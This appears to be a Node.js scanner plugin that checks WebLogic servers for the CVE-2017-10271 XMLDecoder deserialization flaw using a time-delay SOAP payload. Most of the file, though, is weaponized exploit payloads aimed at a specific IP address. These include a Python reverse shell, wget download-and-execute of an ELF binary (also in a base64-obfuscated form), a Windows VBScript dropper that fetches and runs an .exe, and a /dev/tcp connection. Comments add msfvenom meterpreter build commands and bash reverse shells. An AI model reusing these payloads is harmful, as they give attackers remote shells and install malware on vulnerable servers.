module.exports={
	tags:"weblogic,CVE-2017-10271,10271",
	"ID":"030103",
	des:"CVE-2017-10271,weblogic CVE-2017-10271漏洞检测",
	VulApps:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271"],
	urls:[
		"https://nvd.nist.gov/vuln/detail/CVE-2017-10271"],
	suport:g_szMyMsg,
	doCheck:function (url,fnCbk)
	{
		var _t = this, szOld = url;
		// CoordinatorPortType
		// CoordinatorPortType11
		url = url.substr(0, url.indexOf('/',13)) + '/wls-wsat/CoordinatorPortType';
		var s = fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
 <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
  <java version="1.8.0_131" class="java.beans.XMLDecoder">
		<void class="java.lang.Thread">
		  	<void method="sleep">
		  		<long>{num}</long>
		  	</void>
		</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
*/}),s1 = fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("23.105.209.65",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s2 = fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[x=linuxRvsTcp123.elf; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x}; chmod +x ${x}; ./${x} &]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s3 = fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>/bin/bash</string>
              </void>
              <void index="1">
                <string>-c</string>
              </void>
              <void index="2">
                <string><![CDATA[echo 'eD1saW51eFJ2c1RjcDEyMy5lbGY7IHdnZXQgLS1oZWFkZXI9IlVzZXItQWdlbnQ6TW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTJfMykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU2LjAuMjkyNC44NyBTYWZhcmkvNTM3LjM2IiBodHRwOi8vMjMuMTA1LjIwOS42NS8ke3h9OyBjaG1vZCAreCAke3h9OyAuLyR7eH0gJgo='|base64 -d|sh]]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s4 = fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java version="1.8.0_131" class="java.beans.XMLDecoder">
          <void class="java.lang.ProcessBuilder">
            <array class="java.lang.String" length="3">
              <void index="0">
                <string>cmd.exe</string>
              </void>
              <void index="1">
                <string>/c</string>
              </void>
              <void index="2">
                <string><![CDATA['del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://23.105.209.65/Lover1234_65.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs']]></string>
              </void>
            </array>
          <void method="start"/></void>
        </java>
      </work:WorkContext>
    </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
*/}),s5 = fnMyHelp(function(){
/*
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
	<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
		<java version="1.8.0_131" class="java.beans.XMLDecoder">
		  	<void class = "java.io.FileOutputStream">
		  		<object class = "java.io.File">
		  			<string>/dev/tcp/23.105.209.65/777</string>
		  		</object>
		  	</void>
		</java>
	  </work:WorkContext>
	</soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
</soapenv:Envelope>
*/});
// 
// bash -i >& /dev/tcp/23.105.209.65/9999 0>&1
// python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("23.105.209.65",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

// msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=12345 LHOST=23.105.209.65 -f elf  -o ./linuxRvsTcp123.elf
// msfvenom -a x86 --platform linux -p  payload/linux/x86/shell/reverse_tcp LPORT=1234 LHOST=23.105.209.65  -e x86/shikata_ga_nai -b '\x00' -i 8 -f elf -o linuxRvsTcp123.elf
// x=linuxRvsTcp123.elf; wget --header="User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" http://23.105.209.65/${x}; chmod +x ${x}; ./${x} &

		var nNum = new Date().getTime()/1000,nTime = (parseInt(Math.random() * 1000000000)%18 + 15) * 1000;
		s = s.replace(/\{num\}/gmi, nTime).replace(/>\s*</gmi,'><').replace(/[\t\r]/gmi,'');
		// 打开注释，测试存在漏洞的情况下，防火墙有没有限制主动向外连接
		// s = s1;

		request(fnOptHeader({
			timeout: nTime + 5000,
			method: 'POST',
			uri: url,
			body:s
		    ,headers:
		    {
		    	"Host":'127.0.0.1:7001',
		    	"User-Agent": g_szUa,
		    	"content-type":"text/xml"
		    }})
		  , function (error, response, body)
		  {
		  	if(-1 < String(body).indexOf("Invalid attribute for element void:class"))
		  	{
		  		console.log("没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + (response && response.statusCode||0));
		  		return;
		  	}
		  	var nT = new Date().getTime()/1000 - nNum,nT2 = nTime / 1000 - 5;
		  	// console.log(String(body));
		  	// console.log([nT,nT2]);
		  	
	  		if(nT >= nT2 && -1 < String(body).indexOf("<faultstring>0</faultstring>"))
	  		{
	  			var r = {vul:true,"body":String(body),"url":szOld,"send":s,"des":
	  				"发现高危漏洞 WebLogic CVE-2017-10271 反序列化, 延时" + (nTime/1000) + "秒，实际返回耗时：" + nT + "秒",
	  				statusCode:(response && response.statusCode||0)};
	  			// console.log(r);
	  			fnCbk(r,_t);
	  		}
	  		else console.log("没有发现WebLogic CVE-2017-10271 反序列化，response.statusCode：" + (response && response.statusCode||0));
	  		// console.log(body);
		   }
		 );
	}
};